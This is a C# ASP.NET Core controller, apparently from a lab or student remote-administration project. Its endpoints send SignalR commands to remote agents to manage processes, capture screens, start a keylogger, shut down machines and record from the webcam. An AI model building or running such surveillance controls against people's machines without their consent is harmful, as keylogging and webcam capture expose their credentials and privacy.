using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;
using System.Threading.Tasks;
using System.Text.Json;
using YourApplicationName.Hubs;
using YourApplicationName.Dtos; // Dùng DTOs vừa định nghĩa

namespace YourApplicationName.Controllers
{
    // Định tuyến chung là /api/agent
    [ApiController]
    [Route("api/agent")]
    public class AgentController : ControllerBase
    {
        // Inject IHubContext<ControlHub> để gửi lệnh SignalR
        private readonly IHubContext<ControlHub> _hubContext;

        public AgentController(IHubContext<ControlHub> hubContext)
        {
            _hubContext = hubContext;
        }

        // Phương thức chung để gửi lệnh (hạn chế lặp code)
        private async Task DispatchCommand(string agentId, CommandDto command)
        {
            // Chuyển đối tượng CommandDto thành chuỗi JSON
            string commandJson = JsonSerializer.Serialize(command);

            // Gửi lệnh qua SignalR. Agent sẽ lắng nghe phương thức "ReceiveCommand"
            await _hubContext.Clients.Client(agentId).SendAsync("ReceiveCommand", commandJson);
        }

        // ----------------------------------------------------------------------
        // 1. LIST/START/STOP APPLICATIONS (CHẠY TRONG MÀN HÌNH)
        // ----------------------------------------------------------------------

        [HttpPost("{agentId}/applications/list")]
        public async Task<IActionResult> ListApplications(string agentId)
        {
            var command = new CommandDto { Command = "LIST_APPS" };
            await DispatchCommand(agentId, command);
            return Accepted();
        }

        [HttpPost("{agentId}/applications/start")]
        public async Task<IActionResult> StartApplication(string agentId, [FromBody] string applicationName)
        {
            var command = new CommandDto { Command = "START_APP", Target = applicationName };
            await DispatchCommand(agentId, command);
            return Accepted();
        }

        [HttpPost("{agentId}/applications/stop")]
        public async Task<IActionResult> StopApplication(string agentId, [FromBody] string applicationName)
        {
            var command = new CommandDto { Command = "STOP_APP", Target = applicationName };
            await DispatchCommand(agentId, command);
            return Accepted();
        }

        // ----------------------------------------------------------------------
        // 2. LIST/START/STOP PROCESSES (CHẠY TRONG TASK MANAGER)
        // ----------------------------------------------------------------------

        [HttpPost("{agentId}/processes/list")]
        public async Task<IActionResult> ListProcesses(string agentId)
        {
            var command = new CommandDto { Command = "LIST_PROCESSES" };
            await DispatchCommand(agentId, command);
            return Accepted();
        }

        [HttpPost("{agentId}/processes/kill")]
        public async Task<IActionResult> KillProcess(string agentId, [FromBody] int processId)
        {
            // Agent C# sẽ nhận processId và dùng Process.Kill()
            var command = new CommandDto { Command = "KILL_PROCESS", Target = processId.ToString() };
            await DispatchCommand(agentId, command);
            return Accepted();
        }

        // ----------------------------------------------------------------------
        // 3. SCREENSHOT (CHỤP MÀN HÌNH)
        // ----------------------------------------------------------------------

        [HttpPost("{agentId}/screenshot")]
        public async Task<IActionResult> TakeScreenshot(string agentId)
        {
            var command = new CommandDto { Command = "CAPTURE_SCREEN" };
            await DispatchCommand(agentId, command);
            return Accepted(); // Ảnh sẽ được Agent gửi về qua luồng SignalR riêng
        }

        // ----------------------------------------------------------------------
        // 4. KEY LOGGER (NHẬN PHÍM NHẤN REAL-TIME)
        // ----------------------------------------------------------------------

        [HttpPost("{agentId}/keylogger/start")]
        public async Task<IActionResult> StartKeylogger(string agentId)
        {
            var command = new CommandDto { Command = "START_KEYLOG" };
            await DispatchCommand(agentId, command);
            return Accepted();
        }

        [HttpPost("{agentId}/keylogger/stop")]
        public async Task<IActionResult> StopKeylogger(string agentId)
        {
            var command = new CommandDto { Command = "STOP_KEYLOG" };
            await DispatchCommand(agentId, command);
            return Accepted();
        }

        // ----------------------------------------------------------------------
        // 5. SHUTDOWN/RESET/RESTART (LỆNH HỆ THỐNG)
        // ----------------------------------------------------------------------

        [HttpPost("{agentId}/system/shutdown")]
        public async Task<IActionResult> ShutdownSystem(string agentId)
        {
            var command = new CommandDto { Command = "SHUTDOWN" };
            await DispatchCommand(agentId, command);
            return Accepted();
        }

        [HttpPost("{agentId}/system/restart")]
        public async Task<IActionResult> RestartSystem(string agentId)
        {
            var command = new CommandDto { Command = "RESTART" };
            await DispatchCommand(agentId, command);
            return Accepted();
        }

        // ----------------------------------------------------------------------
        // 6. ON/OFF WEBCAM (GHI HÌNH)
        // ----------------------------------------------------------------------

        [HttpPost("{agentId}/webcam/record")]
        public async Task<IActionResult> RecordWebcam(string agentId, [FromBody] int durationSeconds)
        {
            // Ví dụ: Frontend gửi { "durationSeconds": 10 }
            var command = new CommandDto
            {
                Command = "RECORD_WEBCAM",
                DurationSeconds = durationSeconds
            };
            await DispatchCommand(agentId, command);
            return Accepted(); // Video sẽ được Agent gửi về qua luồng SignalR riêng
        }

        // ----------------------------------------------------------------------
        // 7. (BONUS) LẤY DANH SÁCH AGENT ĐANG ONLINE
        // ----------------------------------------------------------------------

        [HttpGet("active")] // URL: /api/agent/active
        public IActionResult GetActiveAgents()
        {
            // Lưu ý: Phải có 1 service/cơ chế để truy cập ActiveAgents
            // Tạm thời trả về 1 danh sách mẫu
            var activeList = new List<object>
            {
                new { Id = "Agent_VM1_12345", Name = "Windows VM (Server)", IpAddress = "192.168.1.10" },
                new { Id = "Agent_VM2_67890", Name = "Lab PC (Test)", IpAddress = "192.168.1.11" }
            };

            return Ok(activeList);
        }
    }
}
